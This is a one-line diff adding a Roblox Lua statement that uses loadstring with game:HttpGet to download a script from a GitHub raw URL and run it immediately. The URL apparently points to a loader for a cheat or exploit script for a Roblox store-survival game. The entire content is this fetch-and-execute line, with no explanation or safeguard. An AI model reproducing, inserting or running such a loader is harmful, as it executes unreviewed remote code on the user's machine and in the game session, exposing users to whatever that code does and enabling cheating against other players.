@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/survive-overnight-in-a-mega-store-spam7-b0ik4ms3oeowvd.lua"))()
